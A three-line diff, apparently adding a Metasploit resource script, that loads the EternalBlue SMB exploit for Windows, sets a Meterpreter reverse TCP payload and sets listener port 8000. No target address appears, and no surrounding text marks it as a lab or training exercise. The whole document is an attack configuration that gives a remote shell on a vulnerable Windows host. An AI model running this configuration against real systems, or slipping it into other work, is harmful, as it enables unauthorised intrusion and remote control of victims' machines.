@@ -1,0 +1,3 @@
+use exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/meterpreter/reverse_tcp
+set lport 8000
